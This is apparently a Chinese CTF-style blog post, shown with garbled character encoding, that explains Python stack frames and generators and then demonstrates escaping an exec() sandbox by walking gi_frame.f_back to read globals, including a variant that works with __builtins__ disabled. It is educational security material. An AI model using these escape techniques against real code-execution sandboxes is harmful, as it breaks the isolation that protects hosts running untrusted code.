<p>æ ˆå¸§ï¼ˆstack frameï¼‰ï¼Œä¹Ÿç§°ä¸ºå¸§ï¼ˆframeï¼‰ï¼Œæ˜¯ç”¨äºæ‰§è¡Œä»£ç çš„æ•°æ®ç»“æ„ã€‚æ¯å½“ Python è§£é‡Šå™¨æ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œç”¨äºå­˜å‚¨è¯¥å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠå…¶ä»–æ‰§è¡Œç›¸å…³çš„ä¿¡æ¯ã€‚è¿™äº›æ ˆå¸§ä¼šæŒ‰ç…§è°ƒç”¨é¡ºåºè¢«ç»„ç»‡æˆä¸€ä¸ªæ ˆï¼Œç§°ä¸ºè°ƒç”¨æ ˆã€‚</p>
<h2 id="æ ˆå¸§è¿ä½œåŸç†"><a href="#æ ˆå¸§è¿ä½œåŸç†" class="headerlink" title="æ ˆå¸§è¿ä½œåŸç†"></a>æ ˆå¸§è¿ä½œåŸç†</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b</span>):</span><br><span class="line">    c = a + b</span><br><span class="line">    bar(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bar</span>(<span class="params">x</span>):</span><br><span class="line">    y = x * <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(y)</span><br><span class="line"></span><br><span class="line">foo(<span class="number">3</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>æ ˆå¸§å˜åŒ–ï¼š</p>
<h3 id="1-è°ƒç”¨-foo-3-4-ï¼š"><a href="#1-è°ƒç”¨-foo-3-4-ï¼š" class="headerlink" title="1.è°ƒç”¨ foo(3, 4)ï¼š"></a>1.è°ƒç”¨ foo(3, 4)ï¼š</h3><p>åˆ›å»º foo å‡½æ•°çš„æ ˆå¸§ï¼Œå‹å…¥è°ƒç”¨æ ˆã€‚<br>foo å‡½æ•°çš„å±€éƒ¨å˜é‡è¡¨åŒ…å« a&#x3D;3, b&#x3D;4ã€‚</p>
<h3 id="2-æ‰§è¡Œ-c-a-bï¼š"><a href="#2-æ‰§è¡Œ-c-a-bï¼š" class="headerlink" title="2.æ‰§è¡Œ c &#x3D; a + bï¼š"></a>2.æ‰§è¡Œ c &#x3D; a + bï¼š</h3><p>åœ¨ foo çš„æ“ä½œæ•°æ ˆä¸Šè®¡ç®— a + bï¼Œå°†ç»“æœ 7 å­˜å‚¨åœ¨å±€éƒ¨å˜é‡ c ä¸­ã€‚</p>
<h3 id="3-è°ƒç”¨-bar-c-ï¼š"><a href="#3-è°ƒç”¨-bar-c-ï¼š" class="headerlink" title="3.è°ƒç”¨ bar(c)ï¼š"></a>3.è°ƒç”¨ bar(c)ï¼š</h3><p>åˆ›å»º bar å‡½æ•°çš„æ ˆå¸§ï¼Œå‹å…¥è°ƒç”¨æ ˆã€‚<br>bar å‡½æ•°çš„å±€éƒ¨å˜é‡è¡¨åŒ…å« x&#x3D;7ã€‚</p>
<h3 id="4-æ‰§è¡Œ-y-x-2ï¼š"><a href="#4-æ‰§è¡Œ-y-x-2ï¼š" class="headerlink" title="4.æ‰§è¡Œ y &#x3D; x * 2ï¼š"></a>4.æ‰§è¡Œ y &#x3D; x * 2ï¼š</h3><p>åœ¨ bar çš„æ“ä½œæ•°æ ˆä¸Šè®¡ç®— x * 2ï¼Œå°†ç»“æœ 14 å­˜å‚¨åœ¨å±€éƒ¨å˜é‡ y ä¸­ã€‚</p>
<h3 id="5-æ‰§è¡Œ-print-y-ï¼š"><a href="#5-æ‰§è¡Œ-print-y-ï¼š" class="headerlink" title="5.æ‰§è¡Œ print(y)ï¼š"></a>5.æ‰§è¡Œ print(y)ï¼š</h3><p>æ‰“å° y çš„å€¼ 14ã€‚</p>
<h3 id="6-bar-å‡½æ•°ç»“æŸï¼š"><a href="#6-bar-å‡½æ•°ç»“æŸï¼š" class="headerlink" title="6.bar å‡½æ•°ç»“æŸï¼š"></a>6.bar å‡½æ•°ç»“æŸï¼š</h3><p>ä»è°ƒç”¨æ ˆä¸­å¼¹å‡º bar çš„æ ˆå¸§ï¼Œé‡Šæ”¾å…¶å†…å­˜ã€‚</p>
<h3 id="7-foo-å‡½æ•°ç»“æŸï¼š"><a href="#7-foo-å‡½æ•°ç»“æŸï¼š" class="headerlink" title="7.foo å‡½æ•°ç»“æŸï¼š"></a>7.foo å‡½æ•°ç»“æŸï¼š</h3><p>ä»è°ƒç”¨æ ˆä¸­å¼¹å‡º foo çš„æ ˆå¸§ï¼Œé‡Šæ”¾å…¶å†…å­˜ã€‚</p>
<h2 id="æ ˆå¸§å±æ€§æ–¹æ³•ä»‹ç»ï¼š"><a href="#æ ˆå¸§å±æ€§æ–¹æ³•ä»‹ç»ï¼š" class="headerlink" title="æ ˆå¸§å±æ€§æ–¹æ³•ä»‹ç»ï¼š"></a>æ ˆå¸§å±æ€§æ–¹æ³•ä»‹ç»ï¼š</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f_locals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åã€‚</span><br><span class="line">f_globals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚</span><br><span class="line">f_code: ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚</span><br><span class="line">f_lasti: æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚</span><br><span class="line">f_back: æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆã€‚</span><br></pre></td></tr></table></figure>

<h2 id="ç”Ÿæˆå™¨ä»‹ç»"><a href="#ç”Ÿæˆå™¨ä»‹ç»" class="headerlink" title="ç”Ÿæˆå™¨ä»‹ç»"></a>ç”Ÿæˆå™¨ä»‹ç»</h2><p>ç”Ÿæˆå™¨ï¼ˆGeneratorï¼‰æ˜¯Pythonä¸­ä¸€ç§ç‰¹æ®Šçš„è¿­ä»£å™¨ï¼Œå®ƒå¯ä»¥åœ¨è¿­ä»£è¿‡ç¨‹ä¸­åŠ¨æ€ç”Ÿæˆå€¼ï¼Œè€Œä¸éœ€è¦ä¸€æ¬¡æ€§å°†æ‰€æœ‰å€¼å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚</p>
<p>å…¶å®ç”Ÿæˆå™¨å°±æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œä¸€è¾¹è¿è¡Œä¸€è¾¹ç”Ÿæˆå€¼ã€‚</p>
<p>[æ™®é€šå‡½æ•°]</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_list</span>():</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">result = get_list()  <span class="comment"># ä¸€æ¬¡æ€§è¿”å›æ•´ä¸ªåˆ—è¡¨ [1, 2, 3]</span></span><br></pre></td></tr></table></figure>

<p>[ç”Ÿæˆå™¨] </p>
<p>è¿™ç§ç‰¹æ®Šçš„å‡½æ•°æ¯æ¬¡åªâ€œäº§å‡ºâ€ä¸€ä¸ªå€¼ï¼ˆyieldï¼‰ï¼Œè¿è¡Œå®Œä¸€ä¸ªå†æ¥ç€è¿è¡Œä¸‹ä¸€ä¸ªï¼Œè€Œä¸æ˜¯ä¸€ä¸‹å­æŠŠæ‰€æœ‰ç»“æœè¿”å›ã€‚ä¼˜ç‚¹ä¸è¨€è€Œå–»ï¼ŒèŠ‚çœå†…å­˜ç©ºé—´ã€‚</p>
<p>ç”Ÿæˆå™¨ä½¿ç”¨<code>yield</code>è¯­å¥æ¥äº§ç”Ÿå€¼ï¼Œæ¯æ¬¡è°ƒç”¨ç”Ÿæˆå™¨çš„<code>next()</code>æ–¹æ³•æ—¶ï¼Œç”Ÿæˆå™¨ä¼šæ‰§è¡Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ª<code>yield</code>è¯­å¥ä¸ºæ­¢ï¼Œç„¶åè¿”å›<code>yield</code>è¯­å¥åé¢çš„å€¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_gen</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">gen = get_gen()  <span class="comment"># ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œåªæ˜¯åˆ›å»ºç”Ÿæˆå™¨å¯¹è±¡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># è¾“å‡º 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># è¾“å‡º 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># è¾“å‡º 3</span></span><br></pre></td></tr></table></figure>

<h2 id="ç”Ÿæˆå™¨å±æ€§"><a href="#ç”Ÿæˆå™¨å±æ€§" class="headerlink" title="ç”Ÿæˆå™¨å±æ€§"></a>ç”Ÿæˆå™¨å±æ€§</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gi_code: ç”Ÿæˆå™¨å¯¹åº”çš„codeå¯¹è±¡ã€‚</span><br><span class="line">gi_frame: ç”Ÿæˆå™¨å¯¹åº”çš„frameï¼ˆæ ˆå¸§ï¼‰å¯¹è±¡ã€‚</span><br><span class="line">gi_running: ç”Ÿæˆå™¨å‡½æ•°æ˜¯å¦åœ¨æ‰§è¡Œã€‚ç”Ÿæˆå™¨å‡½æ•°åœ¨yieldä»¥åã€æ‰§è¡Œyieldçš„ä¸‹ä¸€è¡Œä»£ç å‰å¤„äºfrozençŠ¶æ€ï¼Œæ­¤æ—¶è¿™ä¸ªå±æ€§çš„å€¼ä¸º0ã€‚</span><br><span class="line">gi_yieldfromï¼šå¦‚æœç”Ÿæˆå™¨æ­£åœ¨ä»å¦ä¸€ä¸ªç”Ÿæˆå™¨ä¸­ yield å€¼ï¼Œåˆ™ä¸ºè¯¥ç”Ÿæˆå™¨å¯¹è±¡çš„å¼•ç”¨ï¼›å¦åˆ™ä¸º Noneã€‚</span><br><span class="line">gi_frame.f_localsï¼šä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«ç”Ÿæˆå™¨å½“å‰å¸§çš„æœ¬åœ°å˜é‡ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="ç”Ÿæˆå™¨è¡¨è¾¾å¼"><a href="#ç”Ÿæˆå™¨è¡¨è¾¾å¼" class="headerlink" title="ç”Ÿæˆå™¨è¡¨è¾¾å¼"></a>ç”Ÿæˆå™¨è¡¨è¾¾å¼</h2><p>ä½¿ç”¨ç±»ä¼¼åˆ—è¡¨æ¨å¯¼å¼çš„è¯­æ³•ï¼Œä½†ä½¿ç”¨åœ†æ‹¬å·è€Œä¸æ˜¯æ–¹æ‹¬å·ï¼Œå¯ä»¥ç”¨æ¥åˆ›å»ºç”Ÿæˆå™¨å¯¹è±¡ã€‚ç”Ÿæˆå™¨è¡¨è¾¾å¼ä¼šé€ä¸ªç”Ÿæˆå€¼ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§ç”Ÿæˆæ•´ä¸ªåºåˆ—ï¼Œè¿™æ ·å¯ä»¥èŠ‚çœå†…å­˜ç©ºé—´ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§å‹æ•°æ®é›†æ—¶éå¸¸æœ‰ç”¨ï¼ˆä¾ç„¶ç¬¦åˆæ¯æ¬¡ç”Ÿæˆå€¼åä¿ç•™å½“å‰çš„çŠ¶æ€ï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨æ—¶å¯ä»¥ç»§ç»­ç”Ÿæˆå€¼ï¼‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gen = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(gen))  <span class="comment"># è¾“å‡º [0, 1, 4, 9, 16]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å’Œæ ˆå¸§çš„ç»“åˆ"><a href="#å’Œæ ˆå¸§çš„ç»“åˆ" class="headerlink" title="å’Œæ ˆå¸§çš„ç»“åˆ"></a>å’Œæ ˆå¸§çš„ç»“åˆ</h2><p>æ¥ä¸‹æ¥æˆ‘ç»™ä½ çœ‹ä¸€ä¸ªè„šæœ¬ ä½ å°±çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘è¦ä»‹ç»ç”Ÿæˆå™¨è¿™ä¸ªä¸œè¥¿äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯</span></span><br><span class="line">frame = gen.gi_frame</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè„šæœ¬å¹¶ä¸éš¾ä»¥ç†è§£ï¼Œé¦–å…ˆæ˜¯å®šä¹‰ä¸€ä¸ªç”Ÿæˆå™¨ï¼Œç„¶åæˆ‘ä»¬è°ƒç”¨ç”Ÿæˆå™¨å¹¶ä¸”ä½¿ç”¨gi_frameè·å–äº†å½“å‰ç”Ÿæˆå™¨æ ˆå¸§ï¼Œç„¶åæˆ‘ä»¬åˆè®¿é—®æ ˆå¸§å¯¹è±¡çš„å‡ ä¸ªå±æ€§ï¼š</p>
<p>f_localsæ˜¯æŸ¥çœ‹æ ˆå¸§çš„å­˜å‚¨çš„å±€éƒ¨å˜é‡åï¼Œf_globalsæ˜¯æŸ¥çœ‹å…¨å±€å˜é‡åï¼Œf_codeæ˜¯æŸ¥çœ‹å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ï¼Œf_lastiæ˜¯æŸ¥çœ‹æœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚</p>
<p>ä¹Ÿè®¸è¿™äº›è¯è¯­åˆå˜å¾—å¾ˆæŠ½è±¡ï¼Œä½†æ˜¯è¿è¡Œå‡ºæ¥çš„ç»“æœå°†ä¼šå¾ˆæ¸…æ™°çš„å±•ç¤ºè·å–åˆ°çš„ç”Ÿæˆå™¨çš„å¸§ä¿¡æ¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Local Variables: &#123;&#125;</span><br><span class="line"></span><br><span class="line">Global Variables: &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000024A3485C260</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;D:\\pycharm\\PythonProject\\12121212.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;my_generator&#x27;</span>: &lt;function my_generator at <span class="number">0x0000024A346EA2A0</span>&gt;, <span class="string">&#x27;gen&#x27;</span>: &lt;generator <span class="built_in">object</span> my_generator at <span class="number">0x0000024A64CB1380</span>&gt;, <span class="string">&#x27;frame&#x27;</span>: &lt;frame at <span class="number">0x0000024A347E4E00</span>, file <span class="string">&#x27;D:\\pycharm\\PythonProject\\12121212.py&#x27;</span>, line <span class="number">1</span>, code my_generator&gt;&#125;</span><br><span class="line"></span><br><span class="line">Code Object: &lt;code <span class="built_in">object</span> my_generator at <span class="number">0x0000024A349F1200</span>, file <span class="string">&quot;D:\pycharm\PythonProject\12121212.py&quot;</span>, line <span class="number">1</span>&gt;</span><br><span class="line"></span><br><span class="line">Instruction Pointer: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="åˆ©ç”¨æ ˆå¸§é€ƒé€¸æ²™ç®±"><a href="#åˆ©ç”¨æ ˆå¸§é€ƒé€¸æ²™ç®±" class="headerlink" title="åˆ©ç”¨æ ˆå¸§é€ƒé€¸æ²™ç®±"></a>åˆ©ç”¨æ ˆå¸§é€ƒé€¸æ²™ç®±</h2><p>æ ˆå¸§ï¼ˆstack frameï¼‰æ˜¯å‡½æ•°è°ƒç”¨æ—¶ç”¨æ¥å­˜å‚¨å±€éƒ¨å˜é‡ã€è¿”å›åœ°å€ç­‰çš„ä¸€æ®µå†…å­˜ç©ºé—´ã€‚å¦‚æœä½ èƒ½â€œé€ƒé€¸â€å‡ºè¿™ä¸ªæ ˆå¸§çš„æ§åˆ¶èŒƒå›´ï¼Œä½ å°±èƒ½è®¿é—®ä¿®æ”¹ä¸è¯¥è®¿é—®çš„å†…å­˜ï¼ˆæ¯”å¦‚æ²™ç®±å¤–çš„æ•°æ®æˆ–æŒ‡ä»¤ï¼‰ï¼Œè¿™å°±å«æ ˆå¸§é€ƒé€¸</p>
<p>åŸç†æ˜¯ï¼šæ˜¯é€šè¿‡ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡é€šè¿‡f_backï¼ˆè¿”å›å‰ä¸€å¸§ï¼‰ä»è€Œé€ƒé€¸å‡ºå»è·å–globalsç¬¦å·è¡¨ï¼Œä¾‹å¦‚ï¼š</p>
<p>frame0 (f å†…éƒ¨) â€“&gt; frame1 (waff å‡½æ•°) â€“&gt; frame2 (exec æ‰€åœ¨ä½œç”¨åŸŸ)</p>
<p>ä¸‹é¢è„šæœ¬å°±æ˜¯é€šè¿‡æ ˆå¸§ä¸€æ­¥ä¸€æ­¥æ‹¿åˆ°å…¨å±€å˜é‡s3cretä½†æ˜¯ä¸ç›´æ¥å¼•ç”¨ </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #ç”Ÿæˆå™¨</span></span><br><span class="line"><span class="string">    frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span></span><br><span class="line"><span class="string">    print(frame)</span></span><br><span class="line"><span class="string">    print(frame.f_back)</span></span><br><span class="line"><span class="string">    print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>

<h3 id="è¿‡æ»¤ç»•è¿‡"><a href="#è¿‡æ»¤ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç»•è¿‡"></a>è¿‡æ»¤ç»•è¿‡</h3><p>list send ç”Ÿæˆå™¨è¡¨è¾¾å¼ç»•è¿‡</p>
<p><code>yield</code>è¿‡æ»¤ä¹Ÿå¯ä»¥ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡</p>
<h2 id="globalsä¸­çš„-builtins-å­—æ®µ"><a href="#globalsä¸­çš„-builtins-å­—æ®µ" class="headerlink" title="globalsä¸­çš„__builtins__å­—æ®µ"></a>globalsä¸­çš„__builtins__å­—æ®µ</h2><p>ä»£ç è¿™ä¹ˆè®¾è®¡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;this is flag&quot;</span></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string">    g = f()  #ç”Ÿæˆå™¨</span></span><br><span class="line"><span class="string">    frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;key&#x27;] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code, <span class="built_in">locals</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°†æ²™ç®±ä¸­çš„<code>__builtins__</code>ç½®ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¯´æ²™ç®±ä¸­ä¸èƒ½è°ƒç”¨å†…ç½®æ–¹æ³•äº†ï¼Œé‚£æˆ‘ä»¬è¿™æ®µä»£ç è¿è¡Œå°±ä¼šæŠ¥é”™äº†(nextæ–¹æ³•ä¸èƒ½ä½¿ç”¨)ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•ä»£æ›¿nextæ–¹æ³•æ¥æ‹¿åˆ°ç”Ÿæˆå™¨çš„å€¼ï¼Œè¿˜è®°å¾—ä¸Šé¢è¯´å¯ä»¥éå†çš„å½¢å¼æ¥è·å–ç”Ÿæˆå™¨çš„å€¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;this is flag&quot;</span></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string">    g = f()  #ç”Ÿæˆå™¨</span></span><br><span class="line"><span class="string">    frame = [i for i in g][0] #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_back.f_globals[&#x27;key&#x27;] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code, <span class="built_in">locals</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>â€‹    </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/05/2025-05-05-HTB-Heal/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/05/2025-05-05-HTB-Heal/" class="post-title-link" itemprop="url">HTB-Heal</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
